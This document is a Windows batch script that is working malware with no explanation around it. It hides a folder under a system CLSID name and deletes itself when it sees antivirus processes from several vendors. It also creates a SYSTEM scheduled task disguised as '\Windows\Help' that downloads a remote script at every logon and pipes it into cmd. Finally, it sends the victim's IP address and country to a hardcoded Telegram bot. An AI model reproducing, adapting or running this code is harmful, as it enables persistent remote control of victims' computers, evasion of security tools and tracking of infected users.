rename "%ProgramData%\Comms" "LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"

setlocal EnableDelayedExpansion
if exist "%ProgramData%\logdata..\Index.exe" (
    rd /s /q "%ProgramData%\Comms"
    rd /s /q "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
    exit /b
)
set "processList=ekrn.exe egui.exe spideragent.exe AvastUI.exe avgui.exe avp.exe avpui.exe UninstallTool.exe UninstallToolHelper.exe"

for %a in (%processList%) do (
    tasklist /FI "IMAGENAME eq %a" 2>NUL | find /I "%a" >NUL
    if not errorlevel 1 (
        rd /s /q "%ProgramData%\Comms"
        rd /s /q "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
        exit /b
    )
)
schtasks /create /RU "NT AUTHORITY\SYSTEM" /RL HIGHEST /sc onlogon /tn "\Windows\Help" /tr "%WINDIR%\System32\cmd.exe /c %ProgramData%\ssh\wget.exe -q --hsts-file=NUL -O - https://raw.githubusercontent.com/pushop/0/0/0/zen | cmd /Q /V:ON" /F

chcp 65001 >nul
set "FILE=%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe"
if exist "%FILE%" (
    exit /b
)

set "TOKEN=7324905630:AAGfvsuH0MnwXbqNvvQQlpGMwejdPOJ69g0"
set "CHAT_ID=-4955395962"
set "IP=No IP"
set "Country=No Country"

for /f "tokens=1,2 delims=," %a in ('%ProgramData%\ssh\wget.exe -q --hsts-file=NUL -O - "http://ip-api.com/csv/?fields=country,query" 2^>nul') do (
    if not "%a"=="" set "Country=%a"
    if not "%b"=="" set "IP=%b"
)

%ProgramData%\ssh\wget.exe -q --hsts-file=NUL -O - --post-data="chat_id=%CHAT_ID%&text=RUTZEN%0AIP: %IP%%0ACountry: %Country%" "https://api.telegram.org/bot%TOKEN%/sendMessage" 1>nul 2>nul
endlocal
